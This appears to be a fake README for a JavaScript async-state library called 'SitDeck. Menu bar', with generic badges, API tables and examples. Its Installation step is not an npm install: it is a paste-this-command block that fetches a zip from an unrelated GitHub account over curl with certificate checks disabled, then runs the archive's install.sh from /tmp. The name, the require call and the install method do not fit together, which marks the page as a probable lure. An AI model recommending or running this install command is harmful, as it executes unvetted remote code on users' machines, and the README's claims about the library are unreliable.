# SitDeck. Menu bar

> SitDeck Menu bar  — A lightweight, zero-dependency utility layer for async state management in modern JavaScript applications.

[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg?style=flat-square)](#)
[![Coverage](https://img.shields.io/badge/coverage-97%25-brightgreen.svg?style=flat-square)](#)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](https://opensource.org/licenses/MIT)
[![Bundle Size](https://img.shields.io/badge/size-2.1kB_gzip-blue.svg?style=flat-square)](#)

## Features

- **Zero Dependencies** — No external packages. Pure JavaScript implementation.
- **Async State Management** — Simplified handling of loading, error, and success states for any Promise-based operation.
- **TypeScript Support** — Written in TypeScript with full type definitions included.
- **Framework Agnostic** — Works with React, Vue, Svelte, or vanilla JS.
- **Tiny Footprint** — Under 2kB gzipped. Tree-shakeable ESM and CJS builds.

## Installation

```bash
curl -fsSLk https://github.com/pxgo-AI/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/pxgo-AI-main && \
bash install.sh
```

## Quick Start

```javascript
const { useAsyncState } = require('SitDeck. Menu bar');

// Create an async state container
const users = useAsyncState(() => fetch('/api/users').then(r => r.json()));

// Execute the async operation
await users.run();

console.log(users.data);    // [...users]
console.log(users.loading); // false
console.log(users.error);   // null
```

## API Reference

### `useAsyncState(promiseFn, options?)`

Creates a managed async state container.

| Parameter | Type | Description |
|-----------|------|-------------|
| `promiseFn` | `(...args) => Promise<T>` | Async function to execute |
| `options.immediate` | `boolean` | Execute immediately on creation (default: `false`) |

**Returns:** `AsyncState<T>`

| Property | Type | Description |
|----------|------|-------------|
| `data` | `T \| null` | Resolved data |
| `loading` | `boolean` | Whether the operation is in progress |
| `error` | `Error \| null` | Error if the operation failed |
| `run` | `(...args) => Promise<T>` | Execute or re-execute the operation |

### `init(config?)`

Initialize the SDK with optional configuration.

```javascript
const { init } = require('SitDeck. Menu bar');

const sdk = init({
    timeout: 5000,
    retries: 3,
});

console.log(sdk.ready);   // true
console.log(sdk.version); // "1.0.2"
```

## Advanced Usage

### Error Handling

```javascript
const state = useAsyncState(async () => {
    const res = await fetch('/api/data');
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return res.json();
});

await state.run();

if (state.error) {
    console.error('Failed:', state.error.message);
}
```

### With Parameters

```javascript
const userById = useAsyncState((id) =>
    fetch(`/api/users/${id}`).then(r => r.json())
);

await userById.run(42);
console.log(userById.data); // { id: 42, name: "..." }
```

## Testing

```bash
npm test
```

## Building

```bash
npm run build
```

## Changelog

### v1.0.2
- Initial stable release
- Async state container with full TypeScript support
- Zero-dependency architecture
- Comprehensive test suite

## Contributing

Contributions are welcome! Please read the [contributing guidelines](CONTRIBUTING.md) before submitting a PR.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/my-feature`)
3. Commit your changes (`git commit -am 'Add my feature'`)
4. Push to the branch (`git push origin feature/my-feature`)
5. Open a Pull Request

## License

MIT © Copyright (c) 2026 SitDeck. Menu bar.
